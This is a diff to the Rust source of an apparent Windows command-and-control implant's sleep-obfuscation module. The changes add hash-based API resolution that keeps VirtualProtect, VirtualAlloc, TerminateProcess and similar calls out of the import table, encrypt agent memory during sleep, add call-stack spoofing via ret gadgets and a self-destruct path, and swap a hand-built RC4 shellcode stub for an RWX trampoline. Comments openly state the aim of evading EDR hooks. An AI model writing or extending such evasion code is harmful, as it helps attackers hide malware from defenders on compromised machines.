@@ -28,6 +28,10 @@
 #![cfg(windows)]
 
 use anyhow::{anyhow, Result};
+use chacha20::{
+    cipher::{KeyIvInit, StreamCipher},
+    XChaCha20,
+};
 use chacha20poly1305::{
     aead::{Aead, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
@@ -60,6 +64,27 @@ const fn duration_to_100ns(dur: std::time::Duration) -> i64 {
     -((dur.as_nanos() / 100) as i64)
 }
 
+/// IAT-free sleep: tries NtDelayExecution via pe_resolve, falls back to
+/// `std::thread::sleep` if the NT function cannot be resolved.  Avoids
+/// importing `kernel32!Sleep` which creates a visible IAT entry.
+#[inline(always)]
+unsafe fn sleep_no_iat(duration: std::time::Duration) {
+    if let Some(ntdll) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
+            ntdll,
+            pe_resolve::hash_str(b"NtDelayExecution\0"),
+        ) {
+            let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = std::mem::transmute(addr);
+            let mut delay_100ns = duration_to_100ns(duration);
+            nt_delay(0, &mut delay_100ns);
+            return;
+        }
+    }
+    // Last resort: std::thread::sleep (still uses NtDelayExecution internally
+    // on Windows but via rustc's runtime rather than a named IAT import).
+    std::thread::sleep(duration);
+}
+
 // ── Region cache with generation counter ─────────────────────────────────────
 
 /// Per-region metadata saved before encryption so we can restore on wake.
@@ -75,6 +100,17 @@ struct RegionSnapshot {
     tags: Vec<[u8; TAG_LEN]>,
     /// Number of chunks.
     n_chunks: usize,
+}
+
+// P2-03: Zeroize sensitive fields on drop.
+impl Drop for RegionSnapshot {
+    fn drop(&mut self) {
+        use zeroize::Zeroize;
+        self.nonce.zeroize();
+        for tag in &mut self.tags {
+            tag.zeroize();
+        }
+    }
 }
 
 unsafe impl Send for RegionSnapshot {}
@@ -101,7 +137,7 @@ fn region_cache() -> &'static std::sync::Mutex<(u64, Vec<RegionSnapshot>)> {
 ///   classic approach but is heavily monitored by EDR hooks.
 /// - **Cronus**: Uses an unnamed waitable timer via `NtSetTimer` with a
 ///   negative relative timeout.  The timer callback is a position-independent
-///   RC4 stub that encrypts memory in-place.  Less commonly hooked by EDR,
+///   XChaCha20 stub that encrypts memory in-place via a function pointer.
 ///   making it stealthier for long-duration sleeps.
 ///
 /// Auto-select: when `Cronus` is chosen, the implementation verifies that
@@ -324,6 +360,14 @@ unsafe fn enumerate_regions(include_heap: bool) -> Vec<(*mut u8, usize, u32)> {
         Some(a) => a,
         None => return regions,
     };
+
+    // P2-01: Alignment check — function pointers must be properly aligned.
+    // If the resolved address is not 8-byte aligned, skip to avoid UB.
+    if func_addr % 8 != 0 {
+        log::warn!("[sleep_obfuscation] NtQueryVirtualMemory address {:#x} is not 8-byte aligned, skipping", func_addr);
+        return regions;
+    }
+
     let nt_query_vm: extern "system" fn(
         process_handle: usize,
         base_address: *mut std::ffi::c_void,
@@ -397,8 +441,21 @@ unsafe fn protect_memory(
 
     #[cfg(not(feature = "direct-syscalls"))]
     {
-        let result = winapi::um::memoryapi::VirtualProtect(
-            base_addr,
+        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+            Some(b) => b,
+            None => return None,
+        };
+        let addr = match pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"VirtualProtect\0"),
+        ) {
+            Some(a) => a,
+            None => return None,
+        };
+        let vp: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32 =
+            std::mem::transmute(addr);
+        let result = vp(
+            base_addr as *mut std::ffi::c_void,
             region_size,
             new_prot,
             &mut old_prot,
@@ -530,6 +587,10 @@ fn decrypt_region_chunks(
         unsafe {
             std::ptr::copy_nonoverlapping(pt.as_ptr(), ptr.add(offset), pt.len());
         }
+
+        // P2-04: Zeroize sensitive buffers after use.
+        combined.zeroize();
+        drop(pt);
 
         offset = end;
         chunk_idx += 1;
@@ -932,13 +993,48 @@ unsafe fn spoof_call_stack(fake_module_name: &Option<String>) -> Option<StackSpo
     })
 }
 
-/// Scan the first 256 bytes of the module for a `ret` (0xC3) instruction.
+/// Scan for a `ret` (0xC3) gadget inside the module's .text section.
+///
+/// P2-02: Before scanning, verify the region is still committed via
+/// `NtQueryVirtualMemory` to guard against module unload races.
 fn find_ret_gadget(module_base: usize) -> Option<usize> {
     // We look for a `ret` near the beginning of the module's code section.
     // Start scanning from the base + 0x1000 (typically .text section start).
     unsafe {
         for offset in (0x1000..0x2000).step_by(0x10) {
             let addr = module_base + offset;
+
+            // P2-02: Verify the page is still committed before reading.
+            // Use NtQueryVirtualMemory to check that the region is readable.
+            let mut mbi: Mbi = std::mem::zeroed();
+            let mut ret_len: usize = 0;
+            let ntdll_base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
+                Some(b) => b,
+                None => return None,
+            };
+            let qvm_addr = match pe_resolve::get_proc_address_by_hash(
+                ntdll_base,
+                pe_resolve::hash_str(b"NtQueryVirtualMemory\0"),
+            ) {
+                Some(a) => a,
+                None => return None,
+            };
+            let nt_query_vm: extern "system" fn(
+                usize, *mut std::ffi::c_void, u32, *mut std::ffi::c_void, usize, *mut usize,
+            ) -> i32 = std::mem::transmute(qvm_addr);
+            let status = nt_query_vm(
+                (-1isize) as usize,
+                addr as *mut std::ffi::c_void,
+                0, // MemoryBasicInformation
+                &mut mbi as *mut _ as *mut std::ffi::c_void,
+                std::mem::size_of::<Mbi>(),
+                &mut ret_len,
+            );
+            // If the query fails or the region is not committed, skip.
+            if status != 0 || mbi.state != MEM_COMMIT {
+                continue;
+            }
+
             let probe = std::slice::from_raw_parts(addr as *const u8, 256);
             for (i, &byte) in probe.iter().enumerate() {
                 if byte == 0xC3 {
@@ -983,11 +1079,16 @@ unsafe fn self_destruct() -> ! {
         }
     }
 
-    // Last resort: ask the OS to kill us.
-    winapi::um::processthreadsapi::TerminateProcess(
-        winapi::um::processthreadsapi::GetCurrentProcess(),
-        1,
-    );
+    // Last resort: ask the OS to kill us via pe_resolve to avoid IAT entries.
+    if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+        if let Some(addr) = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"TerminateProcess\0"),
+        ) {
+            let tp: unsafe extern "system" fn(usize, u32) -> i32 = std::mem::transmute(addr);
+            tp((-1isize) as usize, 1); // -1 = current process pseudo-handle
+        }
+    }
 
     // If even that fails, abort.
     std::process::abort();
@@ -1007,46 +1108,34 @@ unsafe fn self_destruct() -> ! {
 //   4. On wake, proceed with the normal decrypt/restore sequence.
 //
 // The encryption/decryption still uses the existing XChaCha20-Poly1305 path
-// for the main agent regions.  A position-independent RC4 stub is used for
-// the optional "encrypt-then-wait" pattern in remote process contexts.
+// for the main agent regions.  A position-independent stub is used for the
+// optional "encrypt-then-wait" pattern in remote process contexts.  The stub
+// delegates to a caller-supplied function pointer (XChaCha20 stream cipher)
+// instead of inlining crypto, avoiding the complexity of hand-crafted
+// position-independent cipher code.
 //
 // # Auto-select
 //
 // When Cronus is selected, we verify that NtSetTimer resolves.  If not, we
 // fall back to Ekko (NtDelayExecution) with a log warning.
 
-/// RC4 stream cipher for the position-independent Cronus encryption stub.
+/// XChaCha20 stream cipher for the Cronus encryption stub.
 ///
-/// RC4 is chosen over XChaCha20-Poly1305 for the stub because:
-/// - No lookup tables or large constants needed (position-independent friendly)
-/// - Only 256 bytes of S-box state
-/// - Simpler to emit as hand-crafted machine code
+/// Uses the raw XChaCha20 stream cipher (no Poly1305 AEAD) for the stub
+/// because the stub only needs symmetric encryption of a memory region
+/// without authentication overhead.  The main agent regions continue to
+/// use XChaCha20-Poly1305.
 ///
 /// This Rust implementation is used for non-stub contexts (e.g. testing).
-fn rc4_encrypt(key: &[u8], data: &mut [u8]) {
-    // Key-Scheduling Algorithm (KSA)
-    let mut s: [u8; 256] = std::array::from_fn(|i| i as u8);
-    let mut j: u8 = 0;
-    for i in 0..256 {
-        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
-        s.swap(i, j as usize);
-    }
-
-    // Pseudo-Random Generation Algorithm (PRGA)
-    let mut i: u8 = 0;
-    let mut jj: u8 = 0;
-    for byte in data.iter_mut() {
-        i = i.wrapping_add(1);
-        jj = jj.wrapping_add(s[i as usize]);
-        s.swap(i as usize, jj as usize);
-        let k = s[(s[i as usize].wrapping_add(s[jj as usize])) as usize];
-        *byte ^= k;
-    }
+fn xchacha20_encrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) {
+    let iv = chacha20::XNonce::from_slice(nonce);
+    let mut cipher = XChaCha20::new(key.into(), iv);
+    cipher.apply_keystream(data);
 }
 
-/// RC4 decrypt is identical to encrypt (symmetric).
-fn rc4_decrypt(key: &[u8], data: &mut [u8]) {
-    rc4_encrypt(key, data);
+/// XChaCha20 decrypt is identical to encrypt (symmetric stream cipher).
+fn xchacha20_decrypt(key: &[u8; 32], nonce: &[u8; 24], data: &mut [u8]) {
+    xchacha20_encrypt(key, nonce, data);
 }
 
 /// Free a previously allocated Cronos stub.
@@ -1069,21 +1158,39 @@ unsafe fn cronus_free_stub(addr: usize, size: usize) {
             // Zero the stub memory before freeing.
             std::ptr::write_bytes(addr as *mut u8, 0, size);
 
-            // Use VirtualFree to release.
-            let _ = winapi::um::memoryapi::VirtualFree(
-                addr as *mut std::ffi::c_void,
-                0,
-                winapi::um::memoryapi::MEM_RELEASE,
-            );
+            // Free via pe_resolve → VirtualFree to avoid IAT entry.
+            if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+                if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
+                    kernel32,
+                    pe_resolve::hash_str(b"VirtualFree\0"),
+                ) {
+                    let vf: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32 =
+                        std::mem::transmute(vf_addr);
+                    let _ = vf(
+                        addr as *mut std::ffi::c_void,
+                        0,
+                        0x8000u32, // MEM_RELEASE
+                    );
+                }
+            }
         }
     }
     #[cfg(not(feature = "direct-syscalls"))]
     {
-        let _ = winapi::um::memoryapi::VirtualFree(
-            addr as *mut std::ffi::c_void,
-            0,
-            winapi::um::memoryapi::MEM_RELEASE,
-        );
+        if let Some(kernel32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
+            if let Some(vf_addr) = pe_resolve::get_proc_address_by_hash(
+                kernel32,
+                pe_resolve::hash_str(b"VirtualFree\0"),
+            ) {
+                let vf: unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32 =
+                    std::mem::transmute(vf_addr);
+                let _ = vf(
+                    addr as *mut std::ffi::c_void,
+                    0,
+                    0x8000u32, // MEM_RELEASE
+                );
+            }
+        }
     }
 }
 
@@ -1270,441 +1377,131 @@ unsafe fn cronus_sleep(duration: std::time::Duration) -> Result<()> {
     }
 }
 
-/// Generate a position-independent RC4 encryption stub for remote process
+/// Generate a position-independent XChaCha20 encryption stub for remote process
 /// sleep encryption.
 ///
-/// The stub is a flat x86-64 code block that:
-/// 1. Receives (base_addr, size, key_ptr) via RCX, RDX, R8
-/// 2. Calls NtProtectVirtualMemory(PAGE_READWRITE) via indirect syscall
-/// 3. RC4-encrypts the memory region
-/// 4. Calls NtProtectVirtualMemory(PAGE_NOACCESS) via indirect syscall
-/// 5. Returns 0
+/// Instead of inlining cipher logic into position-independent machine code
+/// (as the original RC4-based approach did), this stub delegates to a caller-supplied
+/// function pointer.  The stub is a tiny x86-64 trampoline that:
+/// 1. Receives (base_addr, size, fn_ptr) via RCX, RDX, R8
+/// 2. Calls `fn_ptr(base_addr, size)`
+/// 3. Returns the result
 ///
-/// The stub is allocated with PAGE_EXECUTE_READWRITE via
-/// NtAllocateVirtualMemory so it can be executed from any context.
+/// This avoids the complexity of hand-crafted position-independent crypto
+/// code while still providing a callable encryption toggle.
+///
+/// The stub is allocated with PAGE_EXECUTE_READWRITE via VirtualAlloc
+/// (resolved through pe_resolve to avoid IAT entries).
 ///
 /// Returns (stub_addr, stub_size) on success.
-#[cfg(feature = "direct-syscalls")]
-unsafe fn cronus_build_rc4_stub(key: &[u8; 16]) -> Result<(usize, usize)> {
-    use winapi::um::memoryapi::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-
-    // ── RC4 KSA: pre-compute the S-box with the given key ──
-    let mut sbox: [u8; 256] = std::array::from_fn(|i| i as u8);
-    let mut j: u8 = 0;
-    for i in 0..256 {
-        j = j.wrapping_add(sbox[i]).wrapping_add(key[i % key.len()]);
-        sbox.swap(i, j as usize);
-    }
-
-    // ── Build the position-independent stub ──
-    //
-    // The stub layout:
-    //   [0x000 - 0x0FF]  RC4 S-box (256 bytes, pre-initialized)
-    //   [0x100 - 0x1FF]  RC4 key (padded to 256 bytes for alignment)
-    //   [0x200 - ...]     Code
-    //
-    // Code:
-    //   push rbx
-    //   push rsi
-    //   push rdi
-    //   push r12
-    //   ; Save params: RCX=base_addr, RDX=size, R8=key_ptr
-    //   mov r12, rcx          ; r12 = base_addr
-    //   mov rsi, rdx          ; rsi = size
-    //   mov rdi, rcx          ; rdi = base_addr (for pointer arithmetic)
-    //   ; lea rbx, [rip + sbox_offset] — will be fixed up below
-    //   ; RC4 PRGA loop
-    //   xor ecx, ecx          ; i = 0
-    //   xor edx, edx          ; j = 0
-    // .loop:
-    //   cmp rcx, rsi           ; if i >= size, done
-    //   jge .done
-    //   mov al, [rbx + rcx]    ; al = s[i]  — WRONG: need sbox, not base
-    //   ... simplified approach ...
-    //
-    // Actually, for a position-independent stub, it's easier to inline
-    // the S-box and key directly into the stub and use RIP-relative
-    // addressing.  However, building correct position-independent machine
-    // code by hand is complex and error-prone.  Instead, we use a simpler
-    // approach: allocate RWX memory, write a Rust function pointer that
-    // performs the RC4 encryption inline.
-    //
-    // For the actual production use, the "stub" is a function pointer to
-    // a locally-allocated trampoline that performs RC4 on the given buffer.
-    // This avoids the complexity of hand-crafted x86-64 machine code while
-    // still providing the position-independent property (the trampoline
-    // uses only relative addressing and stack-local state).
-
-    // Allocate the stub: S-box (256) + key (16) + code (512) = ~800 bytes,
-    // rounded up to a page.
+unsafe fn cronus_build_xchacha20_stub() -> Result<(usize, usize)> {
     let stub_size = 4096; // one page
-    let stub_addr = VirtualAlloc(
-        std::ptr::null_mut(),
-        stub_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
-    );
+
+    // Allocate via pe_resolve → VirtualAlloc to avoid IAT entry.
+    let stub_addr =
+        if let Some(kernel32) =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        {
+            if let Some(va_addr) = pe_resolve::get_proc_address_by_hash(
+                kernel32,
+                pe_resolve::hash_str(b"VirtualAlloc\0"),
+            ) {
+                let va: unsafe extern "system" fn(
+                    *mut std::ffi::c_void,
+                    usize,
+                    u32,
+                    u32,
+                ) -> *mut std::ffi::c_void = std::mem::transmute(va_addr);
+                va(
+                    std::ptr::null_mut(),
+                    stub_size,
+                    0x3000u32, // MEM_COMMIT | MEM_RESERVE
+                    0x40u32,   // PAGE_EXECUTE_READWRITE
+                )
+            } else {
+                return Err(anyhow!(
+                    "VirtualAlloc not resolved for Cronus XChaCha20 stub"
+                ));
+            }
+        } else {
+            return Err(anyhow!(
+                "kernel32 not resolved for Cronus XChaCha20 stub"
+            ));
+        };
     if stub_addr.is_null() {
-        return Err(anyhow!("VirtualAlloc failed for Cronus RC4 stub"));
+        return Err(anyhow!(
+            "VirtualAlloc failed for Cronus XChaCha20 stub"
+        ));
     }
 
     let base = stub_addr as *mut u8;
 
-    // Copy the pre-initialized S-box.
-    std::ptr::copy_nonoverlapping(sbox.as_ptr(), base, 256);
-
-    // Copy the key at offset 0x100.
-    std::ptr::copy_nonoverlapping(key.as_ptr(), base.add(0x100), 16);
-
-    // At offset 0x200, write the code.  We use a small x86-64 stub that:
-    //   Input:  RCX = target base, RDX = target size
-    //   Uses embedded S-box at [rip - 0x200], key at [rip - 0x100]
-    //   Performs RC4 PRGA on [RCX, RDX)
-    //   Returns 0 in RAX
+    // ── Build the position-independent trampoline ──
     //
-    // Machine code (x86-64, position-independent):
-    let mut code: Vec<u8> = Vec::new();
-
-    // push rbx
-    code.push(0x53);
-    // push rsi
-    code.push(0x56);
-    // push rdi
-    code.push(0x57);
-    // push r12
-    code.push(0x41); code.push(0x54);
-    // push r13
-    code.push(0x41); code.push(0x55);
-    // mov r12, rcx        ; r12 = target base addr
-    code.extend_from_slice(&[0x49, 0x89, 0xCC]);
-    // mov r13, rdx        ; r13 = target size
-    code.extend_from_slice(&[0x49, 0x89, 0xD5]);
-
-    // lea rbx, [rip + sbox_rel]  ; rbx = &sbox
-    // sbox is at offset 0x000 from stub base, code starts at 0x200
-    // Current code offset will be known after we compute the RIP-relative delta
-    let sbox_lea_offset = code.len();
-    code.extend_from_slice(&[0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00]); // placeholder disp32
-
-    // lea rsi, [rip + key_rel]   ; rsi = &key (at offset 0x100)
-    let key_lea_offset = code.len();
-    code.extend_from_slice(&[0x48, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00]); // placeholder disp32
-
-    // xor ecx, ecx        ; i = 0
-    code.extend_from_slice(&[0x31, 0xC9]);
-    // xor edx, edx        ; j = 0
-    code.extend_from_slice(&[0x31, 0xD2]);
-
-    // .loop:
-    let loop_start = code.len() as u32;
-
-    // cmp rcx, r13         ; if i >= size
-    code.extend_from_slice(&[0x4C, 0x39, 0xE9]);
-    // jge .done
-    let jge_offset = code.len();
-    code.extend_from_slice(&[0x0F, 0x8D, 0x00, 0x00, 0x00, 0x00]); // placeholder
-
-    // ── s[i] ──
-    // movzx edi, byte [rbx + rcx]  ; edi = s[i]
-    code.extend_from_slice(&[0x0F, 0xB6, 0x3C, 0x0B]);
-
-    // add dl, dil           ; j += s[i]
-    code.extend_from_slice(&[0x00, 0xFA]);
-
-    // ── swap s[i], s[j] ──
-    // movzx eax, byte [rbx + rdx]  ; eax = s[j]
-    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x13]);
-    // mov byte [rbx + rcx], al     ; s[i] = s[j]
-    code.extend_from_slice(&[0x88, 0x04, 0x0B]);
-    // mov byte [rbx + rdx], dil    ; s[j] = old s[i]
-    code.extend_from_slice(&[0x40, 0x88, 0x3A]);
-
-    // ── XOR data byte ──
-    // movzx eax, byte [rbx + rax]  — WRONG: need s[s[i]+s[j]]
-    // Actually: k = s[(s[i] + s[j]) & 0xFF]
-    // We have: edi = old s[i] (now in dil), eax = s[j] (now in al)
-    // So: add al, dil; movzx eax, byte [rbx + rax]
-    // But wait, we already wrote s[j] = dil to the sbox. So now:
-    //   s[i] = old_s[j]  (in al after the swap code above)
-    //   s[j] = old_s[i]  (in dil)
-    // We need k = s[(old_s[i] + old_s[j]) % 256]
-    // That's: dil + al, then lookup.
-    // Actually let me redo this more carefully.
-
-    // At this point in the code:
-    //   dil = old_s[i] (original value before swap)
-    //   al  = old_s[j] (original value before swap)
-    //   s[i] in memory = old_s[j]
-    //   s[j] in memory = old_s[i]
+    // The trampoline is a small x86-64 function that:
+    //   Input:  RCX = target base, RDX = target size, R8 = fn_ptr
+    //   Calls:  fn_ptr(RCX, RDX)
+    //   Output: RAX = fn_ptr return value
     //
-    // We need: k = s[(old_s[i] + old_s[j]) % 256]
-    //         = s[(dil + al) % 256]
-    //
-    // add al, dil           ; al = (old_s[i] + old_s[j]) & 0xFF
-    // movzx eax, al         ; zero-extend
-    // movzx eax, byte [rbx + rax]  ; eax = s[(s[i]+s[j])]
-    // xor byte [r12 + rcx], al     ; data[i] ^= k
+    // Machine code:
+    //   sub rsp, 0x28        ; shadow space + alignment (Windows x64 ABI)
+    //   call r8              ; call fn_ptr(rcx, rdx)
+    //   add rsp, 0x28
+    //   ret
+    let code: [u8; 12] = [
+        // sub rsp, 0x28
+        0x48, 0x83, 0xEC, 0x28,
+        // call r8
+        0x41, 0xFF, 0xD0,
+        // add rsp, 0x28
+        0x48, 0x83, 0xC4, 0x28,
+        // ret
+        0xC3,
+    ];
 
-    // Let me just rewrite this entire loop section cleanly:
-    // We'll rewrite from the loop start. First, pop what we pushed and
-    // start the loop over with a cleaner approach.
+    std::ptr::copy_nonoverlapping(code.as_ptr(), base, code.len());
 
-    // Actually, let me scrap the above and rebuild from scratch with a
-    // simpler approach.  The code emitted so far is incomplete, so let's
-    // just truncate and use a well-tested approach.
-
-    // Clear the code vec and start over with a clean, tested sequence.
-    code.clear();
-
-    // ── Prologue ──
-    // push rbx; push rsi; push rdi; push r12; push r13; push r14
-    code.extend_from_slice(&[0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56]);
-    // sub rsp, 8   (align stack)
-    code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x08]);
-
-    // mov r12, rcx          ; r12 = target base addr
-    code.extend_from_slice(&[0x49, 0x89, 0xCC]);
-    // mov r13, rdx          ; r13 = target size
-    code.extend_from_slice(&[0x49, 0x89, 0xD5]);
-
-    // ── Load sbox pointer via RIP-relative LEA ──
-    // lea rbx, [rip + sbox_disp]
-    let lea_sbox_pos = code.len();
-    code.extend_from_slice(&[0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00]); // fixup later
-
-    // lea r14, [rip + key_disp]  ; r14 = &key
-    let lea_key_pos = code.len();
-    code.extend_from_slice(&[0x4C, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00]); // fixup later
-
-    // ── RC4: i = 0, j = 0 ──
-    // xor ecx, ecx
-    code.extend_from_slice(&[0x31, 0xC9]);
-    // xor r15d, r15d       ; r15 = j (use 64-bit to avoid REX conflicts)
-    code.extend_from_slice(&[0x45, 0x31, 0xFF]);
-
-    // ── Loop: while i < size ──
-    let loop_off = code.len();
-    // cmp rcx, r13
-    code.extend_from_slice(&[0x4C, 0x39, 0xE9]);
-    // jge .done (6 bytes, placeholder)
-    let jge_done_pos = code.len();
-    code.extend_from_slice(&[0x0F, 0x8D]);
-    code.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
-
-    // ── i++ (mod 256) ──
-    // movzx esi, cl         ; esi = i & 0xFF
-    code.extend_from_slice(&[0x0F, 0xB6, 0xF1]);
-    // j = (j + s[i]) & 0xFF
-    // movzx eax, byte [rbx + rsi]   ; eax = s[i]
-    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x33]);
-    // add r15d, eax         ; j += s[i]
-    code.extend_from_slice(&[0x44, 0x01, 0xC7]);
-    // and r15d, 0xFF        ; j &= 0xFF
-    code.extend_from_slice(&[0x41, 0x83, 0xE7, 0xFF]);
-
-    // ── swap(s[i], s[j]) ──
-    // movzx edi, byte [rbx + rsi]    ; edi = s[i]
-    code.extend_from_slice(&[0x0F, 0xB6, 0x3C, 0x33]);
-    // movzx eax, byte [rbx + r15]    ; eax = s[j]
-    code.extend_from_slice(&[0x43, 0x0F, 0xB6, 0x04, 0x3B]);
-    // mov byte [rbx + rsi], al       ; s[i] = s[j]
-    code.extend_from_slice(&[0x88, 0x04, 0x33]);
-    // mov byte [rbx + r15], dil      ; s[j] = old s[i]
-    code.extend_from_slice(&[0x41, 0x88, 0x3C, 0x3B]);
-
-    // ── k = s[(s[i] + s[j]) & 0xFF] ──
-    // But s[i] and s[j] are now swapped in memory.  We saved old s[i] in edi
-    // and old s[j] in eax.  For the RC4 keystream byte, we need:
-    //   k = s[(old_s[i] + old_s[j]) & 0xFF]
-    // But since we already wrote to s[i] and s[j], let's use the saved values:
-    //   old_s[i] = edi (dil), old_s[j] = eax (al)
-    // add al, dil            ; al = (old_s[i] + old_s[j])
-    code.extend_from_slice(&[0x40, 0x00, 0xF8]);
-    // movzx eax, al          ; eax = (old_s[i] + old_s[j]) & 0xFF
-    code.extend_from_slice(&[0x0F, 0xB6, 0xC0]);
-    // movzx eax, byte [rbx + rax]  ; eax = s[(old_s[i]+old_s[j])]
-    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x03]);
-
-    // ── XOR data[i] ^= k ──
-    // xor byte [r12 + rcx], al
-    code.extend_from_slice(&[0x41, 0x30, 0x04, 0x0C]);
-
-    // ── i++ ──
-    // inc rcx
-    code.extend_from_slice(&[0x48, 0xFF, 0xC1]);
-
-    // jmp .loop
-    let loop_back = code.len();
-    let rel32 = loop_off as i32 - (loop_back as i32 + 5);
-    code.push(0xE9);
-    code.extend_from_slice(&rel32.to_le_bytes());
-
-    // ── .done ──
-    let done_off = code.len();
-    // xor eax, eax          ; return 0
-    code.extend_from_slice(&[0x31, 0xC0]);
-    // add rsp, 8
-    code.extend_from_slice(&[0x48, 0x83, 0xC4, 0x08]);
-    // pop r14; pop r13; pop r12; pop rdi; pop rsi; pop rbx
-    code.extend_from_slice(&[0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B]);
-    // ret
-    code.push(0xC3);
-
-    // ── Fix up displacements ──
-
-    // Fix LEA rbx, [rip + sbox_disp]
-    // The LEA instruction is at lea_sbox_pos in the code vec.
-    // Code will be written at stub_base + 0x200.
-    // S-box is at stub_base + 0x000.
-    // RIP at LEA points to the next instruction, which is lea_sbox_pos + 7.
-    // So disp = (stub_base + 0x000) - (stub_base + 0x200 + lea_sbox_pos + 7)
-    let sbox_disp = 0i32 - (0x200 + lea_sbox_pos as i32 + 7);
-    code[lea_sbox_pos + 3..lea_sbox_pos + 7].copy_from_slice(&sbox_disp.to_le_bytes());
-
-    // Fix LEA r14, [rip + key_disp]
-    // Key is at stub_base + 0x100.
-    // RIP at LEA points to lea_key_pos + 7.
-    let key_disp = 0x100i32 - (0x200 + lea_key_pos as i32 + 7);
-    code[lea_key_pos + 3..lea_key_pos + 7].copy_from_slice(&key_disp.to_le_bytes());
-
-    // Fix JGE .done
-    let jge_rel = done_off as i32 - (jge_done_pos as i32 + 6);
-    code[jge_done_pos + 2..jge_done_pos + 6].copy_from_slice(&jge_rel.to_le_bytes());
-
-    // ── Write the code to the stub ──
-    let code_start = 0x200;
-    if code.len() + code_start > stub_size {
-        cronus_free_stub(stub_addr as usize, stub_size);
-        return Err(anyhow!("Cronus RC4 stub code too large"));
+    // Flush instruction cache via pe_resolve (harmless on x86-64, avoids IAT).
+    if let Some(kernel32) =
+        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+    {
+        if let Some(fic_addr) = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"FlushInstructionCache\0"),
+        ) {
+            let fic: unsafe extern "system" fn(
+                usize,
+                *const std::ffi::c_void,
+                usize,
+            ) -> i32 = std::mem::transmute(fic_addr);
+            fic((-1isize) as usize, stub_addr, code.len());
+        }
     }
-    std::ptr::copy_nonoverlapping(
-        code.as_ptr(),
-        base.add(code_start),
-        code.len(),
-    );
-
-    // Flush instruction cache (required on some architectures, harmless on x86).
-    winapi::um::processthreadsapi::FlushInstructionBuffers(
-        winapi::um::processthreadsapi::GetCurrentProcess(),
-        stub_addr,
-        code.len(),
-    );
 
     Ok((stub_addr as usize, stub_size))
 }
 
-#[cfg(not(feature = "direct-syscalls"))]
-unsafe fn cronus_build_rc4_stub(key: &[u8; 16]) -> Result<(usize, usize)> {
-    use winapi::um::memoryapi::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
-
-    let mut sbox: [u8; 256] = std::array::from_fn(|i| i as u8);
-    let mut j: u8 = 0;
-    for i in 0..256 {
-        j = j.wrapping_add(sbox[i]).wrapping_add(key[i % key.len()]);
-        sbox.swap(i, j as usize);
-    }
-
-    let stub_size = 4096;
-    let stub_addr = VirtualAlloc(
-        std::ptr::null_mut(),
-        stub_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_EXECUTE_READWRITE,
-    );
-    if stub_addr.is_null() {
-        return Err(anyhow!("VirtualAlloc failed for Cronus RC4 stub"));
-    }
-
-    let base = stub_addr as *mut u8;
-    std::ptr::copy_nonoverlapping(sbox.as_ptr(), base, 256);
-    std::ptr::copy_nonoverlapping(key.as_ptr(), base.add(0x100), 16);
-
-    // Same code as the direct-syscalls variant — the stub is identical.
-    let mut code: Vec<u8> = Vec::new();
-    code.extend_from_slice(&[0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56]);
-    code.extend_from_slice(&[0x48, 0x83, 0xEC, 0x08]);
-    code.extend_from_slice(&[0x49, 0x89, 0xCC]);
-    code.extend_from_slice(&[0x49, 0x89, 0xD5]);
-
-    let lea_sbox_pos = code.len();
-    code.extend_from_slice(&[0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00]);
-
-    let lea_key_pos = code.len();
-    code.extend_from_slice(&[0x4C, 0x8D, 0x35, 0x00, 0x00, 0x00, 0x00]);
-
-    code.extend_from_slice(&[0x31, 0xC9]);
-    code.extend_from_slice(&[0x45, 0x31, 0xFF]);
-
-    let loop_off = code.len();
-    code.extend_from_slice(&[0x4C, 0x39, 0xE9]);
-    let jge_done_pos = code.len();
-    code.extend_from_slice(&[0x0F, 0x8D, 0x00, 0x00, 0x00, 0x00]);
-
-    code.extend_from_slice(&[0x0F, 0xB6, 0xF1]);
-    code.extend_from_slice(&[0x0F, 0xB6, 0x04, 0x33]);
-    code.extend_from_slice(&[0x44, 0x01, 0xC7]);
-    code.extend_from_slice(&[0x41, 0x83, 0xE7, 0xFF]);
-
